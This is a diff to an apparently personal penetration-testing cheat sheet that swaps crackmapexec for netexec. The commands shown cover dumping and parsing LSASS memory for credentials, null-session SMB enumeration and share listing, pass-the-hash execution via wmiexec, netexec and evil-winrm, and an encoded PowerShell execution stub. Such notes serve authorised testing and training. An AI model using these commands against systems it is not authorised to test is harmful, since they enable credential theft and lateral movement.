@@ -130,7 +130,7 @@ whoami /priv
 ```
 
 ```bash
-crackmapexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
+netexec smb $TARGET_IP -u $USER -p $PASSWORD -M minidump
 pypykatz lsa minidump lsass.DMP
 ```
 or using netexec
@@ -147,13 +147,13 @@ echo $results
 Add domain NB name to /etc/hosts
 
 ```bash
-crackmapexec smb $TARGET_IP -u '' -p ''
+netexec smb $TARGET_IP -u '' -p ''
 ```
 
 check for open shares
 
 ```bash
-crackmapexec smb $TARGET_IP -u '' -p '' --shares
+netexec smb $TARGET_IP -u '' -p '' --shares
 ```
 
 Enumerate users by brute forcing RID
@@ -189,7 +189,7 @@ sudo mount -o username=$USER,password=$PASSWORD -t cifs \\\\$TARGET_IP\$SHARE /m
 wmiexec (on port 445) with hash (administrator account only):
 #pass-the-hash #pth #wmiexec
 ```bash
-crackmapexec smb -u administrator -H $HASH -X "powershell -e ..."
+netexec smb -u administrator -H $HASH -X "powershell -e ..."
 impacket-wmiexec -hashes :$HASH Administrator@$TARGET_IP
 ```
 smbclient:
@@ -223,7 +223,7 @@ evil-winrm -i $TARGET_IP -u administrator -H $HASH
 ```
 
 ```sh
-crackmapexec winrm $TARGET_IP -u $USER -p $PASSWORD
+netexec winrm $TARGET_IP -u $USER -p $PASSWORD
 ```
 
 
